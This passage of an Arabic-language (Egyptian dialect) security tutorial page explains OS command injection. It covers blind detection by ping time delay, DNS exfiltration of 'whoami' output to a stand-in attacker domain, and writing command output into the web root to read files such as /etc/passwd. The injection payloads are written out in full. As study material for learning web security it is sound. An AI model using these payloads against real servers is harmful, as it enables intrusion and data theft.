+<p>علامة الاقتباس الأولى قفلت القوس المفتوح بتاع السيرفر، فبقى أمر الـ ping فاضي وجاهز. بعدين حطينا الـ <code>&amp;</code> فاشتغلت كفاصل أوامر عادي جداً ونفذت <code>whoami</code> بنجاح!</p>
+</blockquote>
+<hr />
+<h3 id="blind-os-command-injection-vulnerabilities">Blind OS command injection vulnerabilities :</h3>
+<p>في المثال الأولاني اللي شرحناه، السيرفر كان "طيب" وأي أمر بنكتبه كان بيعرض النتيجة بتاعته فوراً في وشنا على الموقع (In-band).</p>
+<p>لكن في الحقيقة، 90% من الثغرات بتكون <strong>Blind (عمياء)</strong>. يعني السيرفر بينفذ الأمر الخبيث في الخلفية فعلاً، بس النتيجة مش بتظهرلك على الشاشة!</p>
+<p><strong>مثال الفورم بتاع الـ Feedback (الشكاوى):</strong> الموقع بياخد شكوتك وإيميلك، وجوه الـ Back-end بيشغل أمر يبعت إيميل للمدير: <code>mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com</code></p>
+<p>لو حقنت أمر <code>echo</code> هنا، السيرفر هينفذه، بس الموقع في النهاية هيعرضلك رسالة غبية زي: <em>"شكراً لك، تم إرسال رسالتك"</em>.. طب إنت كمخترق إزاي هتعرف إن أمرك اتنفذ طالما الشاشة مش بتنطق؟</p>
+<h3 id="3-time-delays">3. الحل السحري: اختبار الوقت (Time Delays)</h3>
+<p>بما إن السيرفر أعمى ومش بيكلمنا، هنخليه يكلمنا بلغة <strong>الوقت</strong>! هنستغل أمر الـ <code>ping</code> كأنه ساعة إيقاف (Stopwatch).</p>
+<p>المخترق بيحقن الأمر ده: <code>&amp; ping -c 10 127.0.0.1 &amp;</code></p>
+<p><strong>تعال نفصص الأمر ده بيعمل إيه:</strong></p>
+<ul>
+<li>
+<p><code>&amp;</code>: بيفصل الأوامر عن بعضها زي ما اتعلمنا.</p>
+</li>
+<li>
+<p><code>ping</code>: أمر بيبعت حزم بيانات لجهاز تاني عشان يشوفه صاحي ولا لأ.</p>
+</li>
+<li>
+<p><code>-c 10</code> (في Linux): معناها ابعت 10 حزم ورا بعض (كل حزمة بتاخد ثانية تقريباً).</p>
+</li>
+<li>
+<p><code>127.0.0.1</code>: ده الـ IP بتاع الجهاز نفسه (Loopback)، يعني السيرفر بيعمل ping على نفسه عشان نضمن إن الشبكة مش هتعطلنا.</p>
+</li>
+</ul>
+<p><strong>المخترق بيراقب إيه هنا؟</strong> المخترق بيبعت الـ Request ويشغل ساعة إيقاف في إيده.</p>
+<ul>
+<li>
+<p>لو الموقع رد عليه في <strong>أقل من ثانية</strong> -&gt; الثغرة مش موجودة والسيرفر طنش الأمر.</p>
+</li>
+<li>
+<p>لو الموقع فضل يلف ويلف (Loading) ورد بعد <strong>10 ثواني بالظبط</strong> -&gt; هيفرح جداً، لأن ده معناه إن السيرفر أعمى بس بيبص في الساعة، ونفذ أمر الـ ping اللي أخر الاستجابة 10 ثواني!</p>
+</li>
+</ul>
+<blockquote>
+<p>💡 <strong>ملحوظة ذكية:</strong> التكنيك ده هو أول خطوة (Detection) عشان تتأكد إن المكان مصاب، بعد كده بتبدأ تفكر إزاي تخليه يبعتلك البيانات برة السيرفر خالص (Out-of-band) أو تفتح Reverse Shell.</p>
+</blockquote>
+<p>تفتكر لو السيرفر اللي بنجرب عليه ده طلع <strong>Windows</strong> مش Linux، أمر الـ Ping اللي فوق ده هيشتغل بنفس الشكل، ولا هنضطر نغير الـ Flags (الحروف) بتاعته؟</p>
+<p>الاجابة لا في الويندوز بنبدل ال  "t-" بال "n-" علشان نحدد عدد الحزم.</p>
+<hr />
+<h3 id="blind-os-command-injection-vulnerabilities-with-data-exfiltration">Blind OS command injection vulnerabilities with data exfiltration:</h3>
+<p>طريقة الـ Time Delay (الـ Ping) اللي اتكلمنا عليها قبل كده كانت حلوة بس عشان "نثبت" إن الثغرة موجودة. لكن لو عايز "تسرق" بيانات (زي اسم المستخدم أو ملفات السيرفر)، مش هتقعد تعمل تكتيك الوقت حرف بحرف لأنك هتموت مشلول! هنا بقى بييجي دور الـ DNS.</p>
+<p>تعال نفكك السحر اللي في الأمر ده حتة حتة:</p>
+<h3 id="_1">تفكيك الأمر الخبيث</h3>
+<p>الأمر اللي إنت كتبته: <code>&amp; nslookup \</code>whoami<code>.kgji2ohoyw.web-attacker.com &amp;</code></p>
+<p>السيرفر لما بييجي ينفذ السطر ده، بيحصل جواه الآتي بالترتيب:</p>
+<ol>
+<li>
+<p><strong>علامة الـ Backticks (<code>`whoami`</code>):</strong> في أنظمة Linux، العلامتين دول معناهم "نفذ الأمر اللي جوانا الأول، وشيلنا وحط النتيجة مكاننا" (Command Substitution). فالسيرفر هينفذ أمر <code>whoami</code> ويلاقي مثلاً إن المستخدم اسمه <code>wwwuser</code>.</p>
+</li>
+<li>
+<p><strong>دمج النتيجة:</strong> السيرفر هيشيل الكلمة بالـ Backticks ويحط النتيجة، فيتحول الأمر بالكامل لـ: <code>nslookup wwwuser.kgji2ohoyw.web-attacker.com</code></p>
+</li>
+<li>
+<p><strong>طلب الـ DNS:</strong> أمر <code>nslookup</code> وظيفته يروح يسأل عمالقة الإنترنت: <em>"يا جماعة، هو الدومين ده الـ IP بتاعه كام؟"</em>.</p>
+</li>
+<li>
+<p><strong>وصول الرسالة للمخترق:</strong> بما إن الدومين <code>web-attacker.com</code> ده بتاع المخترق وهو اللي متحكم في الـ DNS Server بتاعه، فالطلب هيلف في الإنترنت لحد ما يوصل لسيرفر المخترق. المخترق هيبص في السجلات (Logs) عنده هيلاقي طلب جايله من سيرفر الضحية بيقوله: <em>"عايز الـ IP بتاع wwwuser.kgji2ohoyw.web-attacker.com"</em>. بمجرد ما يقرأ السطر ده، المخترق عرف إن اليوزر اسمه <code>wwwuser</code> من غير ما السيرفر ينطق بكلمة واحدة على الموقع!</p>
+</li>
+</ol>
+<h3 id="_2">ليه التكنيك ده ناجح وخطير جداً؟</h3>
+<blockquote>
+<p>🛡️ <strong>ثغرة في الجدار الناري:</strong> الشركات المحترمة بتقفل الـ Outbound Traffic (الحركة الخارجة من السيرفر للإنترنت) عشان السيرفر ما يكلمش حد غريب. فلو حاولت تخليه يفتح موقع ويب عادي (HTTP)، الجدار الناري (Firewall) هيقفله.</p>
+<p>لكن الـ <strong>DNS (Port 53)</strong> مستحيل يتقفل! لأن السيرفر دايماً محتاج يترجم أسماء المواقع لأرقام IPs عشان يعمل التحديثات أو يكلم سيرفرات تانية. فالمخترق هنا بيستغل الـ DNS كـ "نفق سري" يهرب فيه البيانات برة الشركة تماماً.</p>
+</blockquote>
+<p>في أدوات مشهورة جداً بتعملك السيرفر المستقبِل ده بضغطة زرار، زي <strong>Burp Collaborator</strong> أو موقع <strong>Interactsh</strong></p>
+<hr />
+<h3 id="exploiting-blind-os-command-injection-by-redirecting-output">Exploiting blind OS command injection by redirecting output :</h3>
+<h3 id="1_1">1. إزاي التكنيك ده بيشتغل؟</h3>
+<p>الفكرة كلها بتعتمد على إن أي موقع على الإنترنت بيكون له <strong>"مجلد رئيسي" (Web Root)</strong>، وده المكان اللي السيرفر بيسمح لأي حد على الإنترنت إنه يشوف الملفات اللي جواه (زي الصور، ملفات الـ CSS، أو ملفات الـ HTML). في أنظمة Linux، المجلد ده غالباً بيكون في مسار زي <code>/var/www/html/</code> أو <code>/var/www/static/</code>.</p>
+<p>الأمر اللي إنت كتبته: <code>&amp; whoami &gt; /var/www/static/whoami.txt &amp;</code></p>
+<ul>
+<li>
+<p><strong>علامة <code>&gt;</code> (Redirection):</strong> دي المايسترو هنا. العلامة دي بتقول لنظام التشغيل: <em>"بدل ما تطبع نتيجة الأمر على الشاشة، خد النتيجة دي واكتبها جوه الملف اللي هقولك عليه"</em>.</p>
+</li>
+<li>
+<p>فالسيرفر هينفذ أمر <code>whoami</code> (اللي بيجيب اسم المستخدم)، وياخد النتيجة يرميها جوه ملف جديد اسمه <code>whoami.txt</code> في المجلد المسموح للناس تشوفه.</p>
+</li>
+</ul>
+<p>بعد كده، المخترق ببساطة هيفتح المتصفح ويكتب: <code>[https://vulnerable-website.com/whoami.txt](https://vulnerable-website.com/whoami.txt)</code> وهتطلعله النتيجة على الشاشة كأنه بيقرا مقال!</p>
+<h3 id="2_1">2. مميزات التكنيك ده</h3>
+<ul>
+<li>
+<p><strong>ممتاز للبيانات الضخمة:</strong> لو المخترق عايز يقرا ملف فيه سطور كتير (زي ملف الباسوردات <code>/etc/passwd</code>)، الـ DNS مش هيسعفه لأنه بيشيل عدد حروف قليل. لكن هنا هو بيكتب الملف كله ويقراه براحته.</p>
+</li>
+<li>
+<p><strong>سريع ومباشر:</strong> مش محتاج أدوات خارجية زي Burp Collaborator أو سيرفرات وسيطة.</p>
+</li>
+</ul>
+<h3 id="3-the-hackers-reality">3. العقبات في الواقع (The Hacker's Reality)</h3>
+<p>مع إن التكنيك ده يبان سحري، بس في الحقيقة (Real-world Bug Bounty &amp; Pentesting)، بيقابلك فيه مطبين كبار:</p>
+<ol>
+<li>
+<p><strong>تخمين المسار (Path Guessing):</strong> إنت كمخترق مش دايماً بتبقى عارف مسار الـ Web Root بالظبط. هل هو <code>/var/www/html/</code> ولا <code>/opt/lampp/htdocs/</code> ولا متخزن في مكان تاني مخصص للشركة؟ لو كتبت المسار غلط، الملف هيتكريت في مكان مش هتعرف توصله من المتصفح.</p>
+</li>
+<li>
+<p><strong>صلاحيات الكتابة (Write Permissions):</strong> السيرفر غالباً بيكون شغال بمستخدم اسمه <code>www-data</code>. في السيرفرات المتأمنة نص نص، المستخدم ده بيكون مسموح له <strong>يقرا</strong> ملفات الموقع بس، ومش مسموح له <strong>يكتب</strong> أو يكريت ملفات جديدة في مجلدات الموقع الأساسية. لو الصلاحيات مقفولة، الأمر هيفشل ومش هيكريت الملف.</p>
+</li>
+</ol>
+<blockquote>
+<p>💡 <strong>معلومة إضافية (Pro-Tip):</strong> المخترقين أحياناً بيستخدموا علامة <code>&gt;&gt;</code> بدل <code>&gt;</code>. علامة <code>&gt;</code> بتمسح محتوى الملف القديم وتكتب من جديد، لكن <code>&gt;&gt;</code> بتضيف النتيجة في آخر الملف من غير ما تمسح اللي جواه (Append).</p>
+</blockquote>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": [], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u062a\u0645 \u0627\u0644\u0646\u0633\u062e \u0627\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629", "clipboard.copy": "\u0646\u0633\u062e \u0625\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629", "search.result.more.one": "\u0623\u0643\u062b\u0631 \u0645\u0646 1 \u0641\u064a \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629", "search.result.more.other": "\u0623\u0643\u062b\u0631 \u0645\u0646 # \u0641\u064a \u0647\u0630\u0647 \u0627\u0644\u0635\u0641\u062d\u0629", "search.result.none": "\u0644\u0627 \u062a\u0648\u062c\u062f \u0646\u062a\u0627\u0626\u062c", "search.result.one": "\u0646\u062a\u0627\u0626\u062c \u0627\u0644\u0628\u062d\u062b \u0645\u0633\u062a\u0646\u062f \u0648\u0627\u062d\u062f", "search.result.other": "\u0646\u062a\u0627\u0626\u062c \u0627\u0644\u0628\u062d\u062b # \u0645\u0633\u062a\u0646\u062f\u0627\u062a", "search.result.placeholder": "\u0627\u0643\u062a\u0628 \u0644\u0628\u062f\u0621 \u0627\u0644\u0628\u062d\u062b", "search.result.term.missing": "\u0645\u0641\u0642\u0648\u062f", "select.version": "\u0625\u062e\u062a\u0631 \u0627\u0644\u0625\u0635\u062f\u0627\u0631"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
